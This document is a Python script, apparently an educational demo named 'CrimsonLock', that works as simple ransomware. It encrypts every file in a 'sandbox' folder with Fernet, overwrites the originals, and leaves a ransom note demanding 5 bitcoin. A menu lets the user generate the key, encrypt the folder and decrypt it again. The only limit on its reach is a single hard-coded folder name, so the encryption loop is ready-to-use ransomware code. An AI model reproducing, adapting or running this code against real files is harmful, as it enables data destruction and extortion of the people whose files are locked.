import os
from cryptography.fernet import Fernet
from colorama import Fore, Style, init

# Initialize Colors
init(autoreset=True)

class CrimsonLock:
    def __init__(self):
        self.key = None
        self.target_dir = "sandbox" # ⚠️ SAFEGUARD: ONLY ENCRYPTS THIS FOLDER

    def generate_key(self):
        """Generates a master unlock key"""
        self.key = Fernet.generate_key()
        with open("the_key.key", "wb") as key_file:
            key_file.write(self.key)
        print(f"[{Fore.GREEN}+{Style.RESET_ALL}] Master Key generated: the_key.key")

    def load_key(self):
        """Loads the key from file"""
        try:
            with open("the_key.key", "rb") as key_file:
                self.key = key_file.read()
            print(f"[{Fore.CYAN}*{Style.RESET_ALL}] Key loaded successfully.")
        except FileNotFoundError:
            print(f"[{Fore.RED}!{Style.RESET_ALL}] Error: Key not found. Generate one first.")

    def encrypt_files(self):
        """The Attack: Encrypts files in sandbox"""
        self.load_key()
        if not self.key: return

        print(f"\n[{Fore.RED}!!!{Style.RESET_ALL}] STARTING ENCRYPTION SEQUENCE...")
        files = os.listdir(self.target_dir)
        
        for file in files:
            if file == "RANSOM_NOTE.txt": continue # Don't encrypt the note
            
            file_path = os.path.join(self.target_dir, file)
            
            # Read original data
            with open(file_path, "rb") as f:
                data = f.read()
            
            # Encrypt data
            fernet = Fernet(self.key)
            encrypted = fernet.encrypt(data)
            
            # Overwrite file
            with open(file_path, "wb") as f:
                f.write(encrypted)
                
            print(f"[{Fore.RED}LOCKED{Style.RESET_ALL}] {file}")

        # Drop Ransom Note
        with open(f"{self.target_dir}/RANSOM_NOTE.txt", "w") as note:
            note.write("YOUR FILES HAVE BEEN ENCRYPTED BY CRIMSON-LOCK.\nSEND 5 BITCOIN TO UNLOCK.")
        
        print(f"\n[{Fore.RED}💀{Style.RESET_ALL}] ATTACK COMPLETE. CHECK THE SANDBOX.")

    def decrypt_files(self):
        """The Cure: Decrypts files"""
        self.load_key()
        if not self.key: return

        print(f"\n[{Fore.GREEN}***{Style.RESET_ALL}] STARTING DECRYPTION SEQUENCE...")
        files = os.listdir(self.target_dir)
        
        for file in files:
            if file == "RANSOM_NOTE.txt": continue
            
            file_path = os.path.join(self.target_dir, file)
            
            try:
                with open(file_path, "rb") as f:
                    encrypted_data = f.read()
                
                fernet = Fernet(self.key)
                decrypted = fernet.decrypt(encrypted_data)
                
                with open(file_path, "wb") as f:
                    f.write(decrypted)
                    
                print(f"[{Fore.GREEN}UNLOCKED{Style.RESET_ALL}] {file}")
            except:
                print(f"[{Fore.YELLOW}?{Style.RESET_ALL}] Failed to decrypt {file} (Wrong key?)")

        # Remove Note
        if os.path.exists(f"{self.target_dir}/RANSOM_NOTE.txt"):
            os.remove(f"{self.target_dir}/RANSOM_NOTE.txt")
            
        print(f"\n[{Fore.GREEN}✓{Style.RESET_ALL}] SYSTEM RESTORED.")

# --- MENU SYSTEM ---
if __name__ == "__main__":
    tool = CrimsonLock()
    
    print(Fore.RED + """
   ______     _                                __               __  
  / ____/____(_)___ ___  _________  ____      / /   ____  _____/ /__
 / /   / ___/ / __ `__ \/ ___/ __ \/ __ \    / /   / __ \/ ___/ //_/
/ /___/ /  / / / / / / (__  ) /_/ / / / /   / /___/ /_/ / /__/ ,<   
\____/_/  /_/_/ /_/ /_/____/\____/_/ /_/   /_____/\____/\___/_/|_|  
                   https://github.com/devnand-47
    """ + Style.RESET_ALL)

    while True:
        print("\n[1] 🔑 Generate Key (Do this first)")
        print("[2] 🔒 ENCRYPT Sandbox (The Attack)")
        print("[3] 🔓 DECRYPT Sandbox (The Fix)")
        print("[4] ❌ Exit")
        
        choice = input("\nSelect Option: ")
        
        if choice == '1': tool.generate_key()
        elif choice == '2': tool.encrypt_files()
        elif choice == '3': tool.decrypt_files()
        elif choice == '4': break